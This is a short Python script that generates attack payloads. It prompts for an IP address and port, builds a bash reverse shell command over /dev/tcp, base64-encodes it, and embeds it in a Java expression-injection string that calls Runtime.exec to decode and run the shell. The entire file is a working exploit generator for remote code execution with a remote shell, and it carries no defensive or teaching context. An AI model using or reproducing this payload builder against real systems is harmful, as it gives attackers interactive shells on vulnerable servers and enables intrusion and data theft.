import base64

def get_input():
    ip_address = input("IP address: ")
    port = input("port number: ")
    return ip_address, port

def construct_bash_command(ip_address, port):
    return f"bash -i >& /dev/tcp/{ip_address}/{port} 0>&1"

def main():
    ip_address, port = get_input()

    bash_command = construct_bash_command(ip_address, port)
    print("Generated bash command:")
    print(bash_command)

    # Encode the bash command to base64
    base64_command = base64.b64encode(bash_command.encode()).decode()
    print("\nBase64 encoded bash command:")
    print(base64_command)

    # Embed the base64 encoded command into Java code
    java_code = f'*{{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("bash -c {{echo,{base64_command}}}|{{base64,-d}}|{{bash,-i}}").getInputStream()).next()}}'
    print("\nJava code with embedded base64 encoded command:")
    print(java_code)

if __name__ == "__main__":
    main()
